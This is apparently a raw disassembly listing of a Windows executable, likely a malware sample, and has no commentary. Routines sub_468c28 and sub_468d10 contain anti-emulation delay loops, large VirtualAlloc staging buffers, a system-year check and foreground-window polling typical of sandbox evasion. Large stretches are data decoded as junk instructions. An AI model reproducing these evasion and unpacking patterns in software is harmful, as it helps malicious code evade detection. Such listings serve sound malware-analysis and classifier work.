out 0xe0 al
mul cl
cmc
push esp
salc
imul esp [ eax + 0x69d655a1 ] 0xffffff93
insb
sub_46882e
push esi
insb
insb
sti
stosd [ edi ]
movsb [ edi ] [ esi ]
lodsd [ esi ]
les ebx [ bp + si ]
adc eax 0x93939317
jpe r-xdata
add ebp [ esi + 0x4f ]
sbb cl dh
dec ebx
insb
out 0x63 al
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
mov eax 0x9c411762
pop ss
xlat
imul ebp [ esp + ebp * 2 - 0x2e ] 0xbe7a8219
imul ebp [ esp + ebp * 2 + 0x3 ] 0x4fe66c03
rcr [ ecx ] cl
cmp [ edx - 0x42 ] 0x69
insb
insb
add eax [ ebx ]
insb
out 0x4f al
pop edi
insb
insb
rcl [ edx ] 0x1
push esp
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c6f24 ]
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
insd
insb
insb
push ss
push ebx
pushfd
pop ss
cmpsd [ esi ] [ edi ]
sub [ esp + ebp * 2 - 0x60 ] ebp
push ebx
sar [ edx - 0x43 ] cl
sub [ esp + ebp * 2 + 0x3 ] ebp
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
push edx
jpe r-xdata
push esi
insb
insb
jpe r-xdata
push esp
and al ah
sbb dl ch
jmp r-xdata
jpe r-xdata
push ds
salc
xor eax ebx
sbb [ ebp + 0x7b ] dl
dec ebx
pop ebx
insb
insb
0x5316
insb
insb
mov al [ 0x5ac8cd53 ]
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
and al 0x6f
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jb r-xdata
xor eax 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
leave
cmc
sbb al dh
or eax 0x39d61af5
sbb [ ebp - 0x60 ] al
push ebx
stc
out 0xf5 eax
sbb al dh
xor ecx ecx
cmc
sbb bl dh
xor eax 0x6c53577a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
sub_4688db
sbb [ ebp + 0x7b ] dl
push edi
pop ebx
insb
insb
jpe r-xdata
push ss
push ebx
pushfd
push ss
push ss
insb
insb
insb
push ds
out dx al
jpo r-xdata
outsd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
push esp
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ss
sbb al 0x44
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
int1
jpe r-xdata
push ebx
pushfd
pop ss
sub [ esp + ebp * 2 + 0x7a ] ch
rol [ esi + 0x6c ] 0x6c
add eax [ ebx ]
add eax [ ebx ]
stc
cmc
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
sbb dl dh
inc ebp
sbb [ eax + 0x7a ] dl
and eax 0x7b6c6c7a
xchg edx eax
imul ebp [ esp + ebp * 2 - 0x36 ] 0x169c5316
or eax 0x7a6c6c55
pop ds
push ebp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
sbb [ ebp - 0xb ] dl
xchg ebx eax
pushfd
adc al 0x2
insb
insb
jpe r-xdata
insb
insb
push ds
salc
das
retn
sub [ esp + ebp * 2 + 0x3 ] ebp
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
inc edi
insb
add eax [ ebx ]
and ebp [ esp + ebp * 2 + 0x3 ]
push ds
add eax [ ebx ]
jpo r-xdata
pop ecx
insb
insb
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
aad 0xa7
retn
outsd
insb
insb
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0xc7
fwait
retn
xor [ esp + ebp * 2 + 0x3 ] ch
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
loopne r-xdata
xchg ebx eax
sti
bound ecx [ esi + 0x256cd3fa ]
push edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ ebp + 0x7b ] ch
sbb [ ebx ] ebp
insb
insb
adc [ edi - 0x61 ] dl
scasb [ edi ]
jns r-xdata
add edi ecx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3
push ds
and ebp [ esi + 0x6c ]
insb
jpo r-xdata
add ebx [ esi ]
cmc
sbb dl dh
stc
iretd
sub_468a12
outsb
insb
insb
pushfd
and eax 0x24267a69
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
aad 0xa7
retn
sub_468a37
insb
out 0x77 al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
add edi ecx
sbb dl dh
popad

in eax 0xf5
sbb dl dh
arpl bx cx
stc
jecxz r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0xc7
fwait
retn
sub_468a49
pushfd
adc eax 0x93939390
sbb cl dh
outsd
jpe r-xdata
add ebp [ edx + 0x6f ]
sbb [ edx + 0x6c50247a ] dl
insb
add eax [ ebx ]
sbb dh bl
outsd
sbb bh ch
push ds
ja r-xdata
cmp ebp [ esp + ebp * 2 + 0x3 ]
add ebx [ esi + edx + 0x6c6c2328 ]
push ds
push ss
pop ebx
outsb
insb
insb
retn
jpe r-xdata
sbb [ gs : ebp + 0x7a ] bl
add [ esp + ebp * 2 ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
in eax 0xf5
sbb dl dh
arpl bx cx
stc
jecxz r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
add edi ecx
sbb dl dh
popad

add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0xc7
fwait
retn
sub_468a77
imul edi [ edx + 0x2a ] 0x6f
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ edx + 0x6f ]
sbb [ edx + 0x6c50247a ] dl
insb
add eax [ ebx ]
sbb dh bl
outsd
sbb bh ch
push ds
ja r-xdata
jpe r-xdata
sbb [ gs : ebp + 0x7a ] bl
add [ esp + ebp * 2 ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
in eax 0xf5
sbb dl dh
arpl bx cx
stc
jecxz r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
add edi ecx
sbb dl dh
popad

add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0xc7
fwait
retn
sub_468bd0
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x1
nop
nop
mov eax [ ebp - 0x8 ]
test eax eax
jbe r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ eax ] 0x43
nop
nop
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
call sub_403068
nop
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
sub_468c28
push ebp
mov ebp esp
add esp 0xffffffc8
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
nop
nop
nop
mov [ ebp - 0x4 ] 0x1
nop
nop
nop
nop
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x821b5ee
jne r-xdata
push 0x4
push 0x3000
push 0x1bd3d91c
push 0x0
call VirtualAlloc
mov [ ebp - 0xc ] eax
nop
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx 0x1bd3d91c
xor edx edx
mov eax [ ebp - 0xc ]
call sub_468bd0
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
nop
nop
push 0x8000
push 0x0
mov eax [ ebp - 0xc ]
push eax
call VirtualFree
nop
nop
nop
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xab9d
jne r-xdata
nop
nop
push 0x0
call sub_462d0c
nop
nop
mov esp ebp
pop ebp
retn
sub_468ce0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40387c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d0c
retn
sub_468d10
sub [ rw-data ] 0x1
jae r-xdata
retn
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
je r-xdata
nop
nop
mov [ rw-data ] 0x1
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
nop
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
inc [ rw-data ]
cmp [ rw-data ] 0x1b37
jne r-xdata
mov [ rw-data ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
nop
inc [ rw-data ]
cmp [ rw-data ] 0x29270
jne r-xdata
push 0x4
push 0x3000
push 0x1c6846aa
push 0x0
call VirtualAlloc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
nop
nop
mov ecx 0x1c6846aa
xor edx edx
mov eax [ rw-data ]
call sub_468bd0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
mov [ rw-data ] 0x1
nop
retn
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
inc [ rw-data ]
cmp [ rw-data ] 0x8824
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call DialogBoxParamA
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
nop
mov [ rw-data ] 0x0
push rw-data
call GetSystemTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
retn
xor eax eax
mov [ rw-data ] eax
nop
nop
call GetForegroundWindow
mov [ rw-data ] eax
nop
nop
jmp r-xdata
nop
cmp [ rw-data ] 0x3
jle r-xdata
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
add [ rw-data ] 0x1
jno r-xdata
push 0xfa
call sub_405fec
nop
nop
jmp r-xdata
nop
nop
call sub_468c28
jmp r-xdata
call sub_403068
call GetForegroundWindow
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
sub_468f04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468f23
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468f2a
retn
sub_468f2c
aas
add [ eax ] al
add [ edi + ecx * 4 ] dh
inc esi
add [ esp + ebx * 2 + 0x5c740040 ] ah
inc eax
add [ eax + 0x4400405a ] bl
pop edx
inc eax
add [ ebx * 2 + 0x5cec0040 ] bl
inc eax
add [ edx + ebp * 2 + 0x6a5c0040 ] cl
inc eax
add ah al
push 0x40
add [ edx + ebp * 2 + 0xe300040 ] dl
inc ecx
add [ eax ] al
push cs
inc ecx
add ah dl
insd
inc eax
add [ ebp + ebp * 2 - 0x2defffc0 ] ah
inc eax
add [ eax + 0x7c0040d0 ] dl
fiadd [ eax ]
dec esp
fiadd [ eax ]
and al 0x4
inc ecx
add [ ebx + eax + 0x6100041 ] ch
inc ecx
add al ah
add eax 0xdf80041
inc ecx
add [ eax + 0x4800410d ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0xfffbe5c ] bl
xor eax [ edx ]
shl [ ebx ] 0x42
add [ eax + 0x78004236 ] ch
inc edx
add [ edi + ecx * 2 + 0x42 ] bl
add [ edi + ecx * 2 ] bl
inc edx
add [ edi + edi ] ah
inc edx
add ah dh
inc edx
add [ edi + esi + 0x37740042 ] ah
inc edx
add [ eax + ebp * 4 - 0x5773ffbf ] bh
inc ecx
add [ edx + esi + 0x31e00042 ] dh
inc edx
add [ eax ] bl
xor eax 0x34e80044
inc esp
add [ edi + edi + 0x42 ] ah
add [ edi + edi ] dh
inc edx
add ah dl
0x9a640044 0x44
or al 0x61
inc edx
add ah bl
pushad
inc edx
add [ edx + ebp * 2 + 0x6a600042 ] dh
inc edx
add [ eax ] bl
insb
inc edx
add al ch
imul eax [ edx ] 0xffffffe0
imul eax [ edx ] 0xffffffb0
imul eax [ edx ] 0xffffffa8
imul eax [ edx ] 0x78
imul eax [ edx ] 0x70
imul eax [ edx ] 0x40
imul eax [ edx ] 0x50
insb
inc edx
add [ eax ] ah
insb
inc edx
add [ eax - 0x7fffbd40 ] dh
rol [ edx ] 0x50
out 0x42 eax
add [ eax ] ah
out 0x42 eax
add [ edi + ecx * 2 + 0x4f840042 ] dh
inc edx
add [ eax + 0x5c ] cl
inc edx
add [ esp + ebx * 2 ] cl
inc edx
add [ eax + 0x6000426c ] dl
insb
inc edx
add al cl
insb
inc edx
add [ eax - 0x7bffbd94 ] bl
jpo r-xdata
xchg edi eax
add [ eax ] ch
jpo r-xdata
xchg esi eax
inc edx
add [ esi + edx * 4 - 0x1747ffbe ] dh
inc edx
add [ eax + 0x200042e8 ] cl
rol [ edx ] 0xd0
mov edi 0xc0780042
inc edx
add [ eax ] ch
rol [ edx ] 0xa4
nop
inc edx
add [ eax + edx * 4 + 0x42 ] dh
add [ eax ] dh
retn 0x42
inc edx
add al dh
add [ eax + edx * 4 + 0x42 ] al
add ah bh
pop [ edx ]
cmp [ ebx + 0x42 ] ch
add [ eax ] cl
imul eax [ edx ] 0x0
imul eax [ edx ] 0xffffffd0
push 0x42
add [ edi + edi * 4 + 0x42 ] cl
add [ edi + edi * 4 ] al
inc edx
add [ edi + edi * 4 - 0x4093ffbe ] dh
inc edx
add [ esi + edi * 4 - 0x41abffbe ] cl
inc edx
add ah ah
mov esi 0xbeb40042
inc edx
add [ eax - 0x69 ] bh
inc edx
add [ eax - 0x69 ] cl
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_468f2c
call sub_405c30
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455400
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_455418
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455498
call sub_403d88
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405588
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40559c
sub_40121c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401348
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_40387c
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_40387c
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_40387c
sub_40240a
jmp sub_40387c
sub_4026a9
jmp sub_40387c
sub_40276c
call sub_405be4
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405be4
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403e60
sub_402824
push eax
push edx
push ecx
call sub_405be4
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405be4
mov ebx [ eax + 0x4 ]
call sub_405be4
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402904
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402914
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_40298c
mov edx [ eax + 0x1c ]
call sub_402944
retn
sub_402a1f
retn
sub_402a20
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028b8
retn
sub_402c30
mov ecx 0xff
call sub_402c3c
retn
sub_402c60
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c7c
jmp sub_402c7c
sub_402c79
retn
sub_403009
jmp sub_40387c
sub_40305c
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030b4
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4030c0
push ebx
mov ebx eax
mov eax ebx
call sub_4030f0
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403134
pop ebx
retn
sub_4030dc
push ebx
mov ebx eax
mov eax ebx
call sub_40318c
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_4030f0
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403118
call sub_4034b4
test dl dl
jle r-xdata
retn
call sub_40349c
sub_4031d8
retn
sub_403260
jmp sub_40387c
sub_403267
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403370
mov eax 0x8000ffff
retn
sub_403378
retn
sub_40337c
retn
sub_403380
retn
sub_403475
jmp sub_4035c8
sub_40347a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4038dc
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40349c
sub_40349c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4034a4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4034b4
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4034c4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40358c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035a8
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403975
retn
sub_403ab8
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b46
jmp sub_4035c8
sub_403ba6
jmp sub_4035c8
sub_403bc0
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403ab8
mov [ rw-data ] 0x0
call sub_403b60
retn
sub_403cf9
retn
sub_403e5b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e60
mov [ rw-data ] eax
call sub_403d88
sub_40409c
retn
sub_4040d8
retn
sub_4040e6
retn
sub_4040ff
retn
sub_404110
retn
sub_4041f7
retn
sub_404328
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404344#2
jmp sub_404344
sub_40438d
retn
sub_404395
retn
sub_4043d7
retn
sub_404530
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_404548
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4046a0
retn
sub_4046b2
retn
sub_4046b4
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4048dc
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_4049e0
mov ecx 0x1
jmp sub_4048f4
sub_4049ea
retn
sub_4049ec
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404c12
retn
sub_404c14
mov al 0x11
jmp sub_402818
sub_404c3f
retn
sub_404c50
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b20
pop ebp
retn 0x4
j_sub_4048f4
jmp sub_4048f4
sub_404c65
retn
sub_404c68
call sub_404e08
retn
sub_404e94
call sub_404e6c
retn
sub_4051dd
jmp sub_40387c
sub_405348
call sub_405358
retn
sub_405350
call sub_405378
retn
sub_405358
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405413
jmp sub_4035c8
sub_405434
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4054a8
jmp sub_40387c
sub_4054af
pop ecx
pop ebp
retn
sub_405528
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405534
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405540
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405550
call sub_4030c0
mov [ eax + 0x4 ] 0x1
retn
sub_405588
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405877
jmp sub_40387c
sub_40587e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40591b
jmp sub_40387c
sub_405922
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40596b
jmp sub_40387c
sub_405972
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a36
jmp sub_40387c
sub_405a3d
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405a8e
jmp sub_40387c
sub_405a95
pop ebp
retn
sub_405b6c
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405b8c
push eax
push 0x40
call LocalAlloc
retn
sub_405b98
mov eax 0x10
retn
sub_405c24
mov eax rw-data
call sub_405434
retn
sub_405c99
jmp sub_40387c
sub_405ca0
pop ebp
retn
sub_405ca4
sub [ rw-data ] 0x1
retn
sub_405cac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405cc8
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405d11
jmp sub_40387c
sub_405d18
pop ebp
retn
sub_405d1c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
